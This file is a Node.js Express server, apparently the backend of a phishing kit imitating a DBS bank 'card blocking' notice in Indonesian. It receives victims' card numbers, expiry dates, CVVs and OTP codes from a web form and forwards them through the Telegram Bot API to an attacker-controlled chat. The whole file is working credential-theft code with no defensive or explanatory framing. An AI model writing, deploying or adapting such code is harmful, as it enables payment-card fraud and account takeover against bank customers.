const express = require('express');
const fetch = require('node-fetch');
const dotenv = require('dotenv');
dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(__dirname + '/public')); // untuk akses HTML/CSS

app.post('/kirim-ke-telegram', async (req, res) => {
  const { nomor, valid, cvv, otp } = req.body;

  let message = "";

  if (otp) {
    message = `🔐 *Kode OTP Diterima*\n\n*OTP:* ${otp}`;
  } else if (nomor && valid && cvv) {
    message = `🛑 *PEMBLOKIRAN KARTU DBS*\n\n*Nomor:* ${nomor}\n*Valid Thru:* ${valid}\n*CVV:* ${cvv}`;
  } else {
    return res.status(400).send("Data tidak lengkap");
  }

  const chat_id = process.env.CHAT_ID;
  const token = process.env.BOT_TOKEN;

  try {
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id, text: message, parse_mode: "Markdown" })
    });

    if (response.ok) {
      res.sendStatus(200);
    } else {
      const error = await response.json();
      res.status(500).send("Gagal mengirim ke Telegram: " + JSON.stringify(error));
    }
  } catch (error) {
    res.status(500).send("Gagal: " + error.message);
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server aktif di http://localhost:${PORT}`);
});
